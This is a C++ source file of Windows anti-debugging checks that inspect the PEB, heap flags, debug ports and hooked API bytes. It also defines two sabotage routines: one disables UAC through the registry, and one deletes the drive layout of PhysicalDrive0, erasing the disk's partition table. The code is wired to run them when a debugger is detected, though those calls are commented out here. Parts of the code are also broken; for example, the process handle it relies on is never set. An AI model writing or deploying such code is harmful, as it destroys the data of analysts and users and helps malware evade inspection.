#include "IsBeingDebuged.h"
#include <TlHelp32.h>

enum ScyllaTestResult
{
	ScyllaTestOk = 0,
	ScyllaTestFail = 0,
	ScyllaTestDetected = 1,
	ScyllaTestSkip
};

#define SCYLLA_TEST_FAIL_IF(x) if (x) return FALSE;
#define SCYLLA_TEST_CHECK(x) ((x) ? FALSE : TRUE);

#ifdef _WIN64
const bool is_x64 = true;
#else
const bool is_x64 = false;
#endif

HANDLE g_proc_handle, g_stopEvent;

BOOL NTAPI CtrlHandler(ULONG)
{
	// Signal test stop, and don't pass to next handler
	NtSetEvent(g_stopEvent, nullptr);
	return TRUE;
}

HANDLE GetRealCurrentProcess()
{
	auto pseudo_handle = GetCurrentProcess();
	auto hRealHandle = INVALID_HANDLE_VALUE;
	DuplicateHandle(pseudo_handle, pseudo_handle, pseudo_handle, &hRealHandle, 0, FALSE, DUPLICATE_SAME_ACCESS);
	return hRealHandle;
}

BOOL Check_PEB_BeingDebugged()
{
	const auto peb = scl::GetPebAddress(g_proc_handle);
	SCYLLA_TEST_FAIL_IF(!peb);
	return SCYLLA_TEST_CHECK(peb->BeingDebugged == 0);
}

BOOL Check_Wow64PEB64_BeingDebugged()
{
	const auto peb64 = scl::Wow64GetPeb64(g_proc_handle);
	SCYLLA_TEST_FAIL_IF(!peb64);
	return SCYLLA_TEST_CHECK(peb64->BeingDebugged == 0);
}

BOOL Check_PEB_NtGlobalFlag()
{

	const DWORD bad_flags = FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS;
	const auto peb = scl::GetPebAddress(g_proc_handle);
	SCYLLA_TEST_FAIL_IF(!peb);
	return SCYLLA_TEST_CHECK((peb->NtGlobalFlag & bad_flags) == 0);

}

BOOL Check_Wow64PEB64_NtGlobalFlag()
{

	const DWORD bad_flags = FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS;
	const auto peb64 = scl::Wow64GetPeb64(g_proc_handle);
	SCYLLA_TEST_FAIL_IF(!peb64);
	return SCYLLA_TEST_CHECK((peb64->NtGlobalFlag & bad_flags) == 0);

}

BOOL Check_PEB_HeapFlags()
{

	const DWORD bad_flags = HEAP_TAIL_CHECKING_ENABLED | HEAP_FREE_CHECKING_ENABLED | HEAP_SKIP_VALIDATION_CHECKS | HEAP_VALIDATE_PARAMETERS_ENABLED;

	const auto peb = scl::GetPebAddress(g_proc_handle);
	SCYLLA_TEST_FAIL_IF(!peb);

	auto heaps = (void**)peb->ProcessHeaps;
	for (DWORD i = 0; i < peb->NumberOfHeaps; i++)
	{
		auto flags = *(DWORD*)((BYTE*)heaps[i] + scl::GetHeapFlagsOffset(is_x64));
		auto force_flags = *(DWORD*)((BYTE*)heaps[i] + scl::GetHeapForceFlagsOffset(is_x64));

		if ((flags & bad_flags) || (force_flags & bad_flags))
			return ScyllaTestDetected;
	}
	return ScyllaTestOk;

}

BOOL Check_Wow64PEB64_HeapFlags()
{

	const DWORD bad_flags = HEAP_TAIL_CHECKING_ENABLED | HEAP_FREE_CHECKING_ENABLED | HEAP_SKIP_VALIDATION_CHECKS | HEAP_VALIDATE_PARAMETERS_ENABLED;
	const auto peb64 = scl::Wow64GetPeb64(g_proc_handle);
	SCYLLA_TEST_FAIL_IF(!peb64);

	std::basic_string<PVOID64> heaps64;
	heaps64.resize(peb64->NumberOfHeaps);

	SCYLLA_TEST_FAIL_IF(!scl::Wow64ReadProcessMemory64(g_proc_handle, (PVOID64)peb64->ProcessHeaps, (PVOID)heaps64.data(), heaps64.size() * sizeof(PVOID64), nullptr));

	std::basic_string<uint8_t> heap;
	heap.resize(0x100); // hacky
	for (DWORD i = 0; i < peb64->NumberOfHeaps; i++)
	{
		SCYLLA_TEST_FAIL_IF(!scl::Wow64ReadProcessMemory64(g_proc_handle, heaps64[i], (PVOID)heap.data(), heap.size(), nullptr));

		auto flags = *(DWORD*)(heap.data() + scl::GetHeapFlagsOffset(true));
		auto force_flags = *(DWORD*)(heap.data() + scl::GetHeapForceFlagsOffset(true));

		if ((flags & bad_flags) || (force_flags & bad_flags))
			return ScyllaTestDetected;
	}
	return ScyllaTestOk;

}

BOOL Check_PEB_ProcessParameters()
{

	const auto peb = scl::GetPebAddress(g_proc_handle);
	SCYLLA_TEST_FAIL_IF(!peb);

	auto rupp = (scl::RTL_USER_PROCESS_PARAMETERS<DWORD_PTR>*)peb->ProcessParameters;

	return SCYLLA_TEST_CHECK((rupp->Flags & 0x4000) != 0);

}

BOOL Check_Wow64PEB64_ProcessParameters()
{

	const auto peb64 = scl::GetPebAddress(g_proc_handle);
	SCYLLA_TEST_FAIL_IF(!peb64);

	scl::RTL_USER_PROCESS_PARAMETERS<DWORD64> rupp;

	SCYLLA_TEST_FAIL_IF(!scl::Wow64ReadProcessMemory64(g_proc_handle, (PVOID64)peb64->ProcessParameters, (PVOID)&rupp, sizeof(rupp), nullptr));

	return SCYLLA_TEST_CHECK((rupp.Flags & 0x4000) != 0);

}

BOOL Check_IsDebuggerPresent()
{

	return SCYLLA_TEST_CHECK(!IsDebuggerPresent());

}

BOOL Check_CheckRemoteDebuggerPresent()
{

	BOOL present = FALSE;
	CheckRemoteDebuggerPresent(g_proc_handle, &present);
	return SCYLLA_TEST_CHECK(!present);

}

BOOL Check_OutputDebugStringA_LastError()
{

	auto last_error = 0xDEAD;
	SetLastError(last_error);
	OutputDebugStringA("hide from process!");
	return SCYLLA_TEST_CHECK(GetLastError() != last_error);

}

BOOL Check_OutputDebugStringA_Exception()
{

	char text[] = "hide from process!";
	ULONG_PTR args[2];
	args[0] = (ULONG_PTR)strlen(text) + 1;
	args[1] = (ULONG_PTR)text;

	__try
	{
		RaiseException(DBG_PRINTEXCEPTION_C, 0, 2, args);
		return ScyllaTestDetected;
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return ScyllaTestOk;
	}

}

BOOL Check_OutputDebugStringW_Exception()
{

	wchar_t text_w[] = L"hide from process!";
	char text_a[_countof(text_w)] = { 0 };
	WideCharToMultiByte(CP_ACP, 0, text_w, -1, text_a, sizeof(text_a), nullptr, nullptr);

	ULONG_PTR args[4];

	args[0] = (ULONG_PTR)wcslen(text_w) + 1;
	args[1] = (ULONG_PTR)text_w;
	args[2] = (ULONG_PTR)strlen(text_a) + 1;
	args[3] = (ULONG_PTR)text_a;

	__try
	{
		RaiseException(DBG_PRINTEXCEPTION_WIDE_C, 0, 4, args);
		return ScyllaTestDetected;
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return ScyllaTestOk;
	}

}

BOOL Check_NtQueryInformationProcess_ProcessDebugPort()
{

	HANDLE handle = nullptr;
	SCYLLA_TEST_FAIL_IF(!NT_SUCCESS(NtQueryInformationProcess(g_proc_handle, ProcessDebugPort, &handle, sizeof(handle), nullptr)));
	return SCYLLA_TEST_CHECK(handle == nullptr);

}

BOOL Check_NtQuerySystemInformation_KernelDebugger()
{

	SYSTEM_KERNEL_DEBUGGER_INFORMATION SysKernDebInfo;

	SCYLLA_TEST_FAIL_IF(!NT_SUCCESS(NtQuerySystemInformation(SystemKernelDebuggerInformation, &SysKernDebInfo, sizeof(SysKernDebInfo), NULL)));

	if (SysKernDebInfo.KernelDebuggerEnabled || !SysKernDebInfo.KernelDebuggerNotPresent)
	{
		return ScyllaTestDetected;
	}
	return ScyllaTestOk;
;
}

BOOL Check_NtClose()
{

	__try
	{
		NtClose((HANDLE)(ULONG_PTR)0x1337);
		return ScyllaTestOk;
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return GetExceptionCode() == EXCEPTION_INVALID_HANDLE
			? ScyllaTestDetected
			: ScyllaTestFail;
	}

}

BOOL Check_VehDLL()
{

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());
	if (!snapshot)
	{
		return FALSE;
	}
	MODULEENTRY32 mdinfo = { sizeof(mdinfo) };
	if (Module32First(snapshot, &mdinfo))
	{
		do
		{
			if (wcsstr(mdinfo.szModule, L"vehdebug") != nullptr)
			{
				return TRUE;
			}
		} while (Module32Next(snapshot, &mdinfo));
	}
	CloseHandle(snapshot);
	return FALSE;

}

BOOL Cheat_code(PCHAR code)
{

	if (*code == (char)0x31 || *code == (char)0xE9 || *code == (char)0xFF || *code == (char)0xEA)
	{
		return TRUE;
	}
	if (*(INT16*)code == (short)0x3148)
	{
		return TRUE;
	}
	return FALSE;

}

BOOL Check_BeWritedCode()
{
	char* code = nullptr;
	auto md = LoadLibrary(L"kernelbase.dll");
	code = (PCHAR)GetProcAddress(md, "IsDebuggerPresent");
	if (Cheat_code(code))
	{
		return TRUE;
	}
	md = LoadLibrary(L"kernel32.dll");
	code = (PCHAR)GetProcAddress(md, "CheckRemoteDebuggerPresent");
	if (Cheat_code(code))
	{
		return TRUE;
	}
	md = LoadLibrary(L"ntdll.dll");
	code = (PCHAR)GetProcAddress(md, "NtQueryInformationProcess");
	if (Cheat_code(code))
	{
		return TRUE;
	}
	md = LoadLibrary(L"ntdll.dll");
	code = (PCHAR)GetProcAddress(md, "NtQuerySystemInformation");
	if (Cheat_code(code))
	{
		return TRUE;
	}
	md = LoadLibrary(L"ntdll.dll");
	code = (PCHAR)GetProcAddress(md, "NtClose");
	if (Cheat_code(code))
	{
		return TRUE;
	}
	return FALSE;
}

inline void OffUAC()
{
	HKEY hKey;
	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
	{
		//MessageBoxA(NULL, "A Utils", "Can not open Key", NULL);
	}
	else
	{
		DWORD dw = 0;
		if (RegSetValueExA(hKey, "EnableLUA", NULL, REG_DWORD, (const BYTE*)&dw, 4) != ERROR_SUCCESS)
		{
			//MessageBoxA(NULL, "A Utils", "Can not  set EnableLUA", NULL);
		}
		RegCloseKey(hKey);
	}
}
//关键代码！
inline VOID KillDPTable()
{
	DWORD lpByteReturn;
	OVERLAPPED lpOverLapped = { 0 };

	HANDLE hDiskHandle = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	DeviceIoControl(hDiskHandle, IOCTL_DISK_DELETE_DRIVE_LAYOUT, NULL, 0, NULL, 0, &lpByteReturn, &lpOverLapped);

	CloseHandle(hDiskHandle);
}

//千万不能打开调试
BOOL CheckDebugALL()
{
	GetRealCurrentProcess();
	if (
		Check_PEB_BeingDebugged() ||
		Check_Wow64PEB64_BeingDebugged() ||
		Check_PEB_NtGlobalFlag() ||
		Check_Wow64PEB64_NtGlobalFlag() ||
		Check_PEB_HeapFlags() ||
		Check_Wow64PEB64_HeapFlags() ||
		Check_PEB_ProcessParameters() ||
		Check_Wow64PEB64_ProcessParameters() ||
		Check_IsDebuggerPresent() ||
		Check_CheckRemoteDebuggerPresent() ||
		Check_NtQueryInformationProcess_ProcessDebugPort() ||
		Check_NtQuerySystemInformation_KernelDebugger())
	{
		//OffUAC();
		//KillDPTable();
		return TRUE;
	}
	CloseHandle(g_proc_handle);
	return FALSE;
}
